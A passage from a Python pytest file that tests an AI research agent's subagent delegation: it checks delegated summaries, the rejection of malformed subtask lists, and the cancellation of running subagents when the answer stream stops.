    llm = RoutedLLM(
        [delegate("國內出差"), answer("完成")],
        {"國內出差": [tool_call("search_knowledge_base", {"query": "國內出差"})]},
    ).install(monkeypatch)
    await collect(research(agent, "整理國內出差", mode="agent", approval_user_id=7))
    assert llm.stream_calls == 1
    delegated = next(m for m in llm.main_messages[1] if m.get("role") == "tool")["content"]
    assert "子代理收尾摘要 [1]" in delegated
@pytest.mark.asyncio
@pytest.mark.parametrize("tasks", [[], [{"title": "一", "instructions": "x"}] * 4, [{"title": " ", "instructions": "x"}]])
async def test_malformed_subagent_tasks_go_back_to_the_model(monkeypatch, tasks):
    agent = subagent_agent(monkeypatch)
    llm = RoutedLLM([tool_call("delegate_research", {"tasks": tasks}), answer("完成")], {}).install(monkeypatch)
    events = await collect(research(agent, "整理資料", mode="agent", approval_user_id=7))
    assert not [e for e in events if e["event"] == "step_end" and e["data"].get("agent")]
    reply = next(m for m in llm.main_messages[1] if m.get("role") == "tool")
    assert "子任務格式不正確" in reply["content"]
@pytest.mark.asyncio
async def test_stopping_the_answer_cancels_running_subagents(monkeypatch):
    agent = subagent_agent(monkeypatch)
    cancelled = asyncio.Event()
    class SlowLLM(RoutedLLM):
        async def chat(self, messages, **kwargs):
            if messages[0]["content"] == prompts.SUBAGENT_SYSTEM_PROMPT:
                try:
                    await asyncio.sleep(10)
                except asyncio.CancelledError:
                    cancelled.set()
                    raise
            return await super().chat(messages, **kwargs)
    SlowLLM([delegate("國內出差"), answer("完成")], {}).install(monkeypatch)
    stream = research(agent, "整理國內出差", mode="agent", approval_user_id=7)
    async for event in stream:
        if event["event"] == "step_start":
            break
    waiting = asyncio.ensure_future(stream.__anext__())
    await asyncio.sleep(0.05)
    waiting.cancel()
    with pytest.raises((asyncio.CancelledError, StopAsyncIteration)):
        await waiting
    await stream.aclose()
    await asyncio.wait_for(cancelled.wait(), timeout=1)